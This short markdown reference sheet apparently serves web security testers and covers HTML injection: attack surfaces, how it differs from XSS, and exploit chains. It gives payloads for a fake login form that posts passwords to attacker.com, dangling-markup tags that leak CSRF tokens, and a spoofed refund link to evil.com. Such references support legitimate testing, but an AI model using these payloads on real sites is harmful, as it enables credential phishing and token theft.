# HTML Injection Reference

## Attack Surface Signals
- Form fields, user profile names, feedback forms, transactional email body fields reflecting input without allowing full script execution.

## Testing Patterns & Difference from XSS
- **Key Distinction**: HTML injection allows rendering arbitrary HTML markup, but JavaScript execution is blocked or stripped by CSP or sanitizers.
- **Phishing & UI Redressing**:
  - Inject fake login modal: `<form action="https://attacker.com/steal"><input name="pwd" type="password"><button>Session Expired. Login</button></form>`
- **Dangling Markup Injection (Data Exfiltration)**:
  - Inject unclosed tags to exfiltrate anti-CSRF tokens or sensitive page contents:
    `<img src="https://attacker.com/log?data=`
    `<table background="https://attacker.com/leak?`
    `<base href="https://attacker.com/">`
- **Link Spoofing & Defacement**:
  - `<a href="https://evil.com">Click here to claim refund</a>`

## Exploit Chains
- **HTML Injection + Dangling Markup → Anti-CSRF Token / PII Theft**.
- **HTML Injection in Support Emails → Credential Phishing**.
